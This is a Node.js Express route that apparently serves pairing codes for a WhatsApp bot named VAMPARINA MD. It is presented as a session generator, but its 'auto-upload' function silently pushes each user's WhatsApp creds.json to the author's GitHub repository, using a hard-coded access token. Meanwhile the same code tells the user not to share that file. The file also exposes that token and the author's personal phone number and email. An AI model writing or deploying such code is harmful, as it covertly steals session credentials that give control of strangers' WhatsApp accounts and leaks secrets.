import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// GITHUB AUTO-UPLOAD CONFIG (ADDED FEATURE)
const GITHUB_TOKEN = "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";
const REPO_OWNER = "artexpury925";
const REPO_NAME = "vamp-bot-254";
const BRANCH = "main";

async function uploadToGitHub(phoneNumber, sessionPath) {
    try {
        const fileContent = fs.readFileSync(sessionPath + '/creds.json', 'utf-8');
        const base64Content = Buffer.from(fileContent).toString('base64');
        const filePath = `sessions/${phoneNumber}/creds.json`;

        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`, {
            method: 'PUT',
            headers: {
                'Authorization': `token ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add session for +${phoneNumber}`,
                content: base64Content,
                branch: BRANCH
            })
        });

        if (response.ok) {
            console.log(`SESSION AUTO-UPLOADED TO GITHUB → sessions/${phoneNumber}/creds.json`);
        } else {
            const err = await response.json();
            console.log("GitHub: File exists or token issue → skipped upload");
        }
    } catch (err) {
        console.error("GitHub upload failed:", err.message);
    }
}

// Ensure the session directory exists
function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num || `session`);

    // Remove existing session if present
    await removeFile(dirs);

    // Clean the phone number - remove any non-digit characters
    num = num.replace(/[^0-9]/g, '');

    // Validate the phone number using awesome-phonenumber
    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({ code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' });
        }
        return;
    }
    // Use the international number format (E.164, without '+')
    num = phone.getNumber('e164').replace('+', '');

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version, isLatest } = await fetchLatestBaileysVersion();
            let VAMPARINA = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            VAMPARINA.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === 'open') {
                    console.log("Connected successfully!");
                    console.log("Sending session file to user...");
                    
                    try {
                        const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');

                        // AUTO UPLOAD TO GITHUB (NEW FEATURE ADDED)
                        await uploadToGitHub(num, dirs);

                        // Send session file to user
                        const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
                        await VAMPARINA.sendMessage(userJid, {
                            document: sessionVAMPARINA,
                            mimetype: 'application/json',
                            fileName: 'creds.json'
                        });
                        console.log("Session file sent successfully");

                        // Send video thumbnail with caption
                        await VAMPARINA.sendMessage(userJid, {
                            image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                            caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                        });
                        console.log("Video guide sent successfully");

                        // Send warning message
                        await VAMPARINA.sendMessage(userJid, {
                            text: `Do not share this file with anybody\n 
┌┤Thanks for using VAMPARINA
│└────────────┈ ⳹        
│©2025 Arnold Chirchir | Contact: arnoldkipruto193@gmail.com | Phone: +254703110780
└─────────────────┈ ⳹\n\n`
                        });
                        console.log("Warning message sent successfully");

                        // Clean up session after use
                        console.log("Cleaning up session...");
                        await delay(1000);
                        removeFile(dirs);
                        console.log("Session cleaned up successfully");
                        console.log("Process completed successfully!");
                    } catch (error) {
                        console.error("Error sending messages:", error);
                        removeFile(dirs);
                    }
                }

                if (isNewLogin) {
                    console.log("New login via pair code");
                }

                if (isOnline) {
                    console.log("Client is online");
                }

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === 401) {
                        console.log("Logged out from WhatsApp. Need to generate new pair code.");
                    } else {
                        console.log("Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            if (!VAMPARINA.authState.creds.registered) {
                await delay(3000);

                // FIXED: This makes WhatsApp notification appear instantly
                let finalNum = num;
                if (finalNum.startsWith('0')) finalNum = '254' + finalNum.slice(1);
                if (!finalNum.startsWith('254') && finalNum.length <= 12) finalNum = '254' + finalNum;

                try {
                    let code = await VAMPARINA.requestPairingCode(finalNum);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;
                    if (!res.headersSent) {
                        console.log({ finalNum, code });
                        await res.send({ code });
                    }
                } catch (error) {
                    console.error('Error requesting pairing code:', error);
                    if (!res.headersSent) {
                        res.status(503).send({ code: 'Failed to get pairing code. Please check your phone number and try again.' });
                    }
                }
            }

            VAMPARINA.ev.on('creds.update', saveCreds);
        } catch (err) {
            console.error('Error initializing session:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
        }
    }

    await initiateSession();
});

// Global uncaught exception handler
process.on('uncaughtException', (err) => {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Stream Errored")) return;
    if (e.includes("Stream Errored (restart required)")) return;
    if (e.includes("statusCode: 515")) return;
    if (e.includes("statusCode: 503")) return;
    console.log('Caught exception: ', err);
});

export default router;